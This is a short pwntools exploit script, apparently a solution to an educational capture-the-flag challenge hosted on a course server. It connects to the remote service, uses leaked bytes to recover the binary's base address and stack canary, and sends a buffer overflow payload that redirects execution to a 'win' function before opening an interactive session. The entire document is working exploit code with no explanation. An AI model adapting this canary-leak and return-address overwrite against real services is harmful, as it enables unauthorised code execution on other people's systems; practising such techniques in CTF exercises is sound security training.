from pwn import *

exe = context.binary = ELF('./chal')
context.arch = 'amd64'
win_addr = p64(0x0000555555555209)

#io = process(exe.path)
#io.recvuntil(b': ') 

io = remote('edu-ctf.zoolab.org', 10202)
io.recvuntil(b': ')
course_bytes = io.recv(0x20)
print(f'Course bytes: {hexdump(course_bytes)}')
exe.address = u64(course_bytes[0x08:0x10]) - exe.sym._start
canary = course_bytes[-8:] 
print(f'Canary: {canary.hex()}')

payload = b'A' * 0x10 + canary + b'B' * 0x08 + p64(exe.sym.win) # 0x08 for old rbp

# pause()
io.sendline(payload)
io.interactive() 
